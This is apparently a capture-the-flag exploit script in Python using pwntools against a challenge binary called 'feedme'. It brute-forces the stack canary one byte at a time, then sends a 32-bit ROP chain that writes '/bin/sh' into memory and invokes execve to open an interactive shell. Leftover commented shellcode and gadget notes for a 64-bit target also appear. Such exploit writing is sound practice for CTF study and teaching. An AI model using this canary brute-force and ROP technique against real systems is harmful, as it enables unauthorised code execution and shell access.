from pwn import *


#context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

#target = remote("chal1.sieberr.live", 15001)


elf = context.binary = ELF('./feedme')  # local copy
rop = ROP(elf)

target = process()

#pid, io_gdb = gdb.attach(target, api=True, gdbscript="c")

# This shellcode is originally from: https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/
# However it looks like that site is down now
# This shellcode will pop a shell when we run it
#payload += b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05" 
#payload += b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
# Padding to the return address
#payload += b"0"*(0x28 - len(payload))

# Overwrite the return address with the address of the start of our input

# Send the payload, drop to an interactive shell to use the shell we pop


offset_to_canary = 0x20
offset_to_eip = 0x30
canary = b'\x00'  # First byte is always null

'''
mov_gadget = 0x48d251
pop_rax = rop.find_gadget(['pop rax', 'ret']).address
pop_rdi =  rop.find_gadget(['pop rdi', 'ret']).address
pop_rsi = rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address
pop_rdx = rop.find_gadget(['pop rdx', 'ret']).address
syscall = rop.find_gadget(['syscall', 'ret']).address
'''

byte_size = 0x22
for i in range(3):  # Brute-force next 3 bytes
    for guess in range(256):
        payload = b"A" * offset_to_canary + canary + bytes([guess])
        
        target.recvuntil(b"FEED ME!")

        target.send(bytes([p32(byte_size)[0]])) #Only for this challenge
        target.send(payload)

        response = target.recvuntil(b"exit.")
        if b"YUM" in response:
            #Correct canary
            print(f'Found byte {i+2}: {hex(guess)}')
            canary += bytes([guess])
            byte_size += 0x1
            break

print("CANARY FOUND:", canary.hex())

'''
pop rax; ret
0x6b6000
pop rdx; ret
"/bin/sh\x00"
mov qword ptr [rax], rdx ; ret

pop rax ; ret
0x3b
pop rdi ; ret
0x6b6000
pop rsi r15 ; ret
0
0
pop rdx ; ret
0
syscall ; ret

'''


# This will cover the space up to, and including the canary
payload = b"0"*0x20 + canary

# This will cover the rest of the space between the canary and the return address
payload += b"1"*0xc

# Start putting together the ROP Chain

# This is to write the string '/bin' to the bss address 0x80eb928. Since this is 32 bit, registers can only hold 4 bytes, so we can only write 4 characters at a time
payload += p32(0x080bb496)	# pop eax ; ret
payload += p32(0x80eb928)	# bss address
payload += p32(0x0806f34a)	# pop edx
payload	+= p32(0x6e69622f)	# /bin string in hex, in little endian
payload += p32(0x0807be31)	# mov dword ptr [eax], edx ; ret

# Write the second half of the string '/bin/sh' the '/sh' to 0x80eb928 + 0x4
payload += p32(0x080bb496)	# pop eax ; ret
payload += p32(0x80eb928 + 0x4)	# bss address + 0x4 to write after '/bin'
payload += p32(0x0806f34a)	# pop edx
payload	+= p32(0x0068732f)	# /sh string in hex, in little endian
payload += p32(0x0807be31)	# mov dword ptr [eax], edx ; ret

# Now that we have the string '/bin/sh' written to 0x80eb928, we can load the appropriate values into the eax, ecx, edx, and ebx registers and make the syscall.
payload += p32(0x080bb496)	# pop eax ; ret
payload += p32(0xb)			# 11
payload += p32(0x0806f371)	# pop ecx ; pop ebx ; ret
payload += p32(0x0)			# 0x0
payload += p32(0x80eb928)	# bss address
payload += p32(0x0806f34a)	# pop edx ; ret
payload += p32(0x0)			# 0x0
payload += p32(0x8049761)	# syscall

# Send the amount of bytes for our payload, and the payload itself
target.send("\x78")
target.send(payload)

# Drop to an interactive shell
target.interactive()